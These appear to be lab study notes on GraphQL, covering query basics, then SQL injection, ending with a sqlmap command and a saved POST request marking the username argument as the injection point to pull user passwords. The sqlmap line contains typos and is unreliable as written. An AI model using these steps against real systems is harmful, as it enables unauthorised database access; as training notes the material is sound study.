GraphQL is a query language typically used by web APIs as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the primary benefits of using GraphQL over traditional REST APIs is the efficiency in resource utilization and request handling.
Basic Overview
````bash
{
  users {
    id
    username
    role
  }
}
````
The resulting GraphQL response is structured in the same way and might look something like this:
````bash
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
````
 GraphQL queries support sub-querying, which enables a query to retrieve details from an object that references another object. For instance, assume that a posts query returns a field author that holds a user object. We can then query the username and role of the author in our query like so:
 ````bah
{
  posts {
    title
    author {
      username
      role
    }
  }
}
````
The result contains the title of all posts as well as the queried data of the corresponding author:
````bash
{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}
````
command to display the "id" and "secret" of "SecretObject":
````bash
{
  secrets {
    id
    secret
  }
}
````
### Injection Attacks
One of the most common web vulnerabilities are injection attacks such as SQL Injection, Cross-Site Scripting (XSS), and Command Injection. Like all web applications, GraphQL implementations can also be vulnerable to these issues.
### SQL Injection
Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. Therefore, we should carefully investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.
## SQLMAP command on the "author" parameter:
````bash
sqlmap -r req.txt _D db -T flag --colums
````
## req.txt:
````bash
POST /graphql? HTTP/1.1
Host: <IP:PORT>
Content-Length: 74
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Origin: http://<IP:PORT>
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"query":"{user(username: \"admin*\") { uuid username password }}"
}
````
